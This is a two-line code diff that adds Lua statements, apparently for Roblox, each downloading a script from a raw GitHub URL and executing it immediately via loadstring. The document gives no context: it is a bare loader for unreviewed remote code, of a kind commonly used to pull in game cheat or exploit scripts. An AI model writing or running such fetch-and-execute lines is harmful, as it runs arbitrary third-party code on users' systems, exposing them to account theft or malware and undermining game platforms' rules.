@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/M4Txmajid/script/refs/heads/main/goat"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/M4Txmajid/script/refs/heads/main/men"))()
